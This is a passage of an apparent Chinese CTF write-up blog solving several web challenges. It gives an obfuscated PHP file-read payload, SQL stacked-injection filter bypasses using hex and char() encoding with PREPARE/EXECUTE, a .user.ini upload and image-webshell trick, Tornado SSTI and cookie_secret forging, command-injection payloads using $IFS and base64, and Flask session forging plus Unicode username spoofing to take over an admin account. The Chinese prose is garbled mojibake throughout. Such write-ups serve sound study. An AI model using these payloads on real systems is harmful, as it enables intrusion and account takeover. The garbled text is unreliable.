class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))))</span><br></pre></td></tr></table></figure>

<p>åœ¨æ ¹ç›®å½•å‘ç° flag æ–‡ä»¶<code>f1agg</code>ã€‚<br> æœ€ç»ˆ payload æ„é€ ï¼š<code>(serIALIze)(FILe(/f1agg))</code>è¯»å–æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))))</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„æœ€åå‘é€çš„æ—¶å€™éœ€è¦å† URLencode ä¸€ä¸‹ã€‚</p>
<h3 id="3-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#3-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="3.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>3.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h3><p>æ¨ä¸€æ³¢MrYunenå¸ˆå‚…çš„<a href="https://xz.aliyun.com/t/7169#toc-47" target="_blank" rel="noopener">æ³¨å…¥åœ£ç»</a></p>
<p>å°è¯•è¯­å¥<code>1&#39; or 1=1 #</code>å‘ç°è¿”å›å¤šä¸ªç»“æœï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥</p>
<p>æ¥ç€ order byçˆ†å­—æ®µ å‘ç°å°±ä¸¤ä¸ªå­—æ®µ</p>
<p>ç„¶åæŸ¥è¯¢æ•°æ®ï¼Œæœ‰è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨å †å æ³¨å…¥ï¼ŒåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡ ; å·æ³¨å…¥å¤šæ¡SQLè¯­å¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1'; <span class="keyword">show</span> <span class="keyword">databases</span>; <span class="comment">#</span></span><br><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>; <span class="comment">#  //è¡¨åæ˜¯æ•°å­—ç”¨åå¼•å·</span></span><br></pre></td></tr></table></figure>

<p>flagå°±åœ¨è¿™ä¸²æ•°å­—è¡¨ä¸­</p>
<ol>
<li><p>é€šè¿‡ç¼–ç ç»•è¿‡</p>
<p> å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°† select * from  `1919810931114514` è¿›è¡Œ16è¿›åˆ¶ç¼–ç å†é€šè¿‡æ„é€ payloadå¾—</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0';<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;<span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p> å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡ <code>char()</code></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0';<span class="keyword">set</span> @s=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">103</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">96</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">56</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">48</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">51</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">53</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">96</span>));<span class="keyword">PREPARE</span> a <span class="keyword">FROM</span> @s;<span class="keyword">EXECUTE</span> a;</span><br></pre></td></tr></table></figure>

<ul>
<li>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚</li>
<li>executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚</li>
<li>SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚</li>
</ul>
</li>
<li><p>handler</p>
<p> mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="4-SUCTF-2019-CheckIn"><a href="#4-SUCTF-2019-CheckIn" class="headerlink" title="4.[SUCTF 2019]CheckIn"></a>4.[SUCTF 2019]CheckIn</h3><p>æ–‡ä»¶çš„å†…å®¹ä¸èƒ½åŒ…å«<code>&lt;?</code>ï¼Œä½†å¯ä»¥ä¸Šä¼ <code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>ç±»å‹çš„å›¾ç‰‡é©¬æ¥ç»•è¿‡</p>
<p>åˆ©ç”¨ <code>.user.ini</code>ç»•è¿‡,è§£æphp</p>
<p>åˆ©ç”¨å‰æ</p>
<ol>
<li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP</li>
<li>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼</li>
<li>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li>
</ol>
<p><img src="/2020/06/6æœˆåˆ·é¢˜è®°å½•/image-20200608004804065.png" alt="image-20200608004804065"></p>
<p>å…³é”®åœ¨è¿™ä¸¤ä¸ªå…³é”®å­—</p>
<p><img src="/2020/06/6æœˆåˆ·é¢˜è®°å½•/image-20200608004839982.png" alt="image-20200608004839982"></p>
<p><strong>auto_prepend_file</strong>æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›<strong>auto_append_file</strong>åœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<code>exit()</code>æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰</p>
<p>å…ˆä¸Šä¼  <code>.user.ini</code></p>
<p><img src="/2020/06/6æœˆåˆ·é¢˜è®°å½•/image-20200608005009468.png" alt="image-20200608005009468"></p>
<p>æ¥ç€ä¼ é©¬</p>
<p><img src="/2020/06/6æœˆåˆ·é¢˜è®°å½•/image-20200608005047907.png" alt="image-20200608005047907"></p>
<p>å†å»è®¿é—®ä¸Šä¼ ç›®å½•å³å¯è·å¾—flag</p>
<h3 id="5-æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#5-æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="5.[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>5.[æŠ¤ç½‘æ¯ 2018]easy_tornado</h3><p>flag.txt æç¤ºflagåœ¨ <code>/fllllllllllllag</code> </p>
<p>welcome.txt çš„render å¯èƒ½å­˜åœ¨SSTIæ³¨å…¥</p>
<p>hints.txt æç¤ºæˆ‘ä»¬ filehashçš„åŠ å¯†æ ¼å¼ md5(cookie_secret+md5(filename))</p>
<p>å…ˆç›´æ¥è®¿é—® <code>/fllllllllllllag</code>  ç›´æ¥æŠ¥é”™ï¼Œçœ‹URLåº”è¯¥æ˜¯SSTIæ³¨å…¥</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;<span class="number">2</span>^<span class="number">1</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å›æ˜¾ <code>3</code> ï¼Œè¿‡æ»¤äº†å¾ˆå¤šç¬¦å·ï¼Œå‘½ä»¤æ‰§è¡Œå°±åˆ«æƒ³äº†</p>
<p>è¯´æ˜ç¡®å®å­˜åœ¨æ³¨å…¥ã€‚åé¢å¦‚ä½•é€šè¿‡æ³¨å…¥å¾—åˆ° cookie_secretå®åœ¨æ˜¯ä¸çŸ¥é“</p>
<p>å¤§ä½¬ä¸€å¥ é˜…è¯»tornadoæºç </p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/tornadoweb/</span>tornado<span class="regexp">/blob/m</span>aster<span class="regexp">/tornado/</span>auth.py</span><br></pre></td></tr></table></figure>

<p>å‘ç°<code>handler.settings</code>å­˜æ”¾äº†cookie_secret ï¼ˆORZ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">cookie_secret = <span class="string">'8bf1192d-691c-4345-8667-78a8a7899ff0'</span></span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">hash = hashlib.md5((cookie_secret + hashlib.md5(filename.encode()).hexdigest()).encode())</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure>

<p>æ„é€ ä¸‹URLå³å¯æ‹¿åˆ°flag</p>
<h3 id="6-GXYCTF2019-Ping-Ping-Ping"><a href="#6-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="6.[GXYCTF2019]Ping Ping Ping"></a>6.[GXYCTF2019]Ping Ping Ping</h3><p>ç®€å•çš„å‘½ä»¤æ³¨å…¥</p>
<p>ç›´æ¥ç”¨ <code>;</code>åˆ†å‰²å‘½ä»¤æˆåŠŸï¼Œç›´æ¥æ‰§è¡Œ <code>ls</code>å›æ˜¾ <code>flag.php</code>å’Œ<code>index.php</code>æ¥ç€è¯»<code>index.php</code>å‘ç°è¿‡æ»¤äº†ç©ºæ ¼ç”¨ <code>$IFS$9</code>ç»•è¿‡</p>
<p>å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ç”¨çš„æ˜¯base64ç»•è¿‡</p>
<p>payload </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;`<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$9Y2F0IGZsYWcucGhwCg</span>==|base64<span class="variable">$IFS</span><span class="variable">$9</span>-d`</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–payload</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1</span>`<span class="keyword">ls</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="comment">//    die("fxck your flag!");</span></span><br><span class="line"><span class="comment">//åŒ¹é…ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ˜¯å¦æŒ‰é¡ºåºå‡ºç°è¿‡flagå››ä¸ªå­—æ¯</span></span><br><span class="line">;a=<span class="keyword">g</span>;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>

<h3 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h3><p>åœ¨ç™»å½•é¡µé¢çš„æ³¨é‡Šä¸­æœ‰ä¸€å¥</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure>

<p>éšä¾¿æ³¨å†Œä¸ªè´¦å·è¿›å»ï¼Œåœ¨æ”¹å˜å¯†ç çš„é¡µé¢æ³¨é‡Šæ³„éœ²githubåœ°å€<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
<p>åœ¨index.htmlä¸­</p>
<p><img src="/2020/06/6æœˆåˆ·é¢˜è®°å½•/image-20200622145001059.png" alt="image-20200622145001059"></p>
<p>adminç™»å½•åå¾—åˆ°flag</p>
<p>è¿™é“é¢˜æœ‰ä¸¤ç§è§£æ³•</p>
<ul>
<li><p>sessionä¼ªé€ </p>
<p>  æ ¹æ®På¸ˆå‚…çš„<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œflaskçš„sessionéƒ½æ˜¯åœ¨æœ¬åœ°çš„ï¼Œé€šè¿‡ä¸€ä¸ªSECRET_KEYè¿›è¡Œç­¾å,å¯ä»¥ç›´æ¥ä½¿ç”¨<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">è„šæœ¬</a>è¿›è¡ŒåŠ è§£å¯†</p>
  <figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager<span class="number">3</span>.py decode -<span class="keyword">c</span> .eJxFUE<span class="number">2</span>LwjAU_CvLO<span class="number">3</span>uIFi-CB<span class="number">6E2</span>VHgvWFLDy<span class="number">0</span>VcrW<span class="number">3</span>axoW<span class="number">2</span>Ylvxv<span class="number">2</span>_Xhd<span class="number">3</span>DnGaYryccr<span class="number">03</span>WFrDqmns<span class="number">2</span>g<span class="number">6</span>O<span class="number">7</span>wOoJH<span class="number">5</span>-wAlzgkj<span class="number">0</span>LNFQrmRQqjAXrxOF<span class="number">4</span>FlZHzpZFhWFRsIk<span class="number">8</span>euvYpAPrNKCSfrRLJdOedT<span class="number">5</span>ajz<span class="number">3</span>Jg<span class="number">1</span>fhXqCO<span class="number">59</span>bwYP<span class="number">2</span>hVLoKUMYPkuR<span class="number">5</span>rAb<span class="number">2</span>SUmG<span class="number">52</span>xQqHDnUEbeSlzwuFnimAdWpsOE<span class="number">0</span>YYHN-XXrLlHiQMZXMNrBue<span class="number">2</span>uR<span class="number">67</span>ryq<span class="number">7</span>_U<span class="number">2</span>wfttbY<span class="number">2</span>vUG<span class="number">0</span>EyqaZaAZdFjT<span class="number">6</span>pyewXpPePqcZAeleRjAMVbgVt<span class="number">1</span>m<span class="number">8750959</span>n<span class="number">9</span>GZAXlv<span class="number">8</span>zt<span class="number">5</span>CcCuqztYAb<span class="number">3</span>Nmvet<span class="number">8</span>FcwOsb<span class="number">4</span>eJsVg.XvhXYA.DtOXFn-B-CxhrW<span class="number">07</span>nqEb<span class="number">1</span><span class="keyword">i9</span>eswM</span><br><span class="line"></span><br><span class="line">'&#123;<span class="string">"_fresh"</span>:True,<span class="string">"_id"</span>:b<span class="string">"3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c"</span>,<span class="string">"csrf_token"</span>:b<span class="string">"fa1efe1044dd827b8e2de5d654099252d4b78144"</span>,<span class="string">"image"</span>:b<span class="string">"0Vt6"</span>,<span class="string">"name"</span>:<span class="string">"admin"</span>,<span class="string">"user_id"</span>:<span class="string">"10"</span>&#125;'</span><br></pre></td></tr></table></figure>

<p>  ç„¶åæºç ä¸­æœ‰SECRET_KEY</p>
<p>  <img src="/2020/06/6æœˆåˆ·é¢˜è®°å½•/image-20200622144648942.png" alt="image-20200622144648942"></p>
  <figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t "&#123;<span class="string">'_fresh'</span>: True,<span class="string">'_id'</span>: b<span class="string">'3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c'</span>,<span class="string">'csrf_token'</span>:b<span class="string">'fa1efe1044dd827b8e2de5d654099252d4b78144'</span>,<span class="string">'image'</span>:b<span class="string">'0Vt6'</span>,<span class="string">'name'</span>:<span class="string">'admin'</span>,<span class="string">'user_id'</span>:<span class="string">'10'</span>&#125;" -s ckj123</span><br><span class="line">.eJxFUE1rwkAQ_Stlzh5WgxfBgxCzRJgJho3L7EWsxmSTjIWomET8700ttId3eo_39YT9uc2vJSxu7T2fwN6fYPGEj09YAM5wzsIKLTWJTsskjBWb1ONwVM5E3lVljWFZso0ExXm2Wc8mC6iiH-080VnHphicYEd6J0m4VWjiqbPcO9lViakD1PGDNAkPdc-SVmR5yhZVEm486kicxhkPqzkOReB01o8YXLjzY37DhjvU2JPFJbwmcLy25_3tq84vfxOcrDtnXYNmpUin9Vgr4KpsUNKG7HZGZvsYa_RkNjXpOEjCtaLV8m3n5VDk_2dETlHxy1wOMhJwOIm_wATu17x9_wZTBa9vTipsnw.XvhesQ.opeFEuwbfnBJs_j3BEQR_eCGvXE</span><br></pre></td></tr></table></figure>


</li>
</ul>
<pre><code>ç”¨è¿™ä¸ªcookieè®¿é—® å³å¯å¾—åˆ°flag</code></pre><ul>
<li><p>Unicodeæ¬ºéª—</p>
<p>  æºç ä¸­æ˜¾ç¤ºï¼Œå„ç§æ“ä½œå‰éƒ½ä¼šå¯¹ç”¨æˆ·åè¿›è¡Œè‡ªå®šä¹‰çš„strlower</p>
  <figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span></span><span class="symbol">:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>

<p>  nodeprep.prepareå¯¹åº”çš„åº“æ˜¯Twistedï¼Œrequirements.txtä¸­æ˜¾ç¤ºTwisted==10.2.0</p>
<p>  ç‰ˆæœ¬éå¸¸è€ã€‚</p>
<p>  unicodeé—®é¢˜ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œnodeprep.prepareä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œ</p>
  <figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">á´¬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure>

<p>  å³ç¬¬ä¸€æ¬¡å°†å…¶è½¬æ¢ä¸ºå¤§å†™ï¼Œç¬¬äºŒæ¬¡å°†å…¶è½¬æ¢ä¸ºå°å†™</p>
<p>  é‚£ä¹ˆï¼Œæ”»å‡»é“¾å¤§æ¦‚å°±è¿™æ ·</p>
<ul>
<li>æ³¨å†Œç”¨æˆ·á´¬dmin</li>
<li>ç™»å½•ç”¨æˆ·á´¬dminï¼Œå˜æˆAdmin</li>
<li>ä¿®æ”¹å¯†ç Adminï¼Œæ›´æ”¹äº†adminçš„å¯†ç </li>
</ul>
</li>
</ul>
<h3 id="8-DASCTF-å…­æœˆèµ›-ç®€å•çš„è®¡ç®—é¢˜"><a href="#8-DASCTF-å…­æœˆèµ›-ç®€å•çš„è®¡ç®—é¢˜" class="headerlink" title="8.[DASCTF å…­æœˆèµ›]ç®€å•çš„è®¡ç®—é¢˜"></a>8.<strong>[DASCTF å…­æœˆèµ›]ç®€å•çš„è®¡ç®—é¢˜</strong></h3><p>æœ€å¼€å§‹çš„æºç </p>
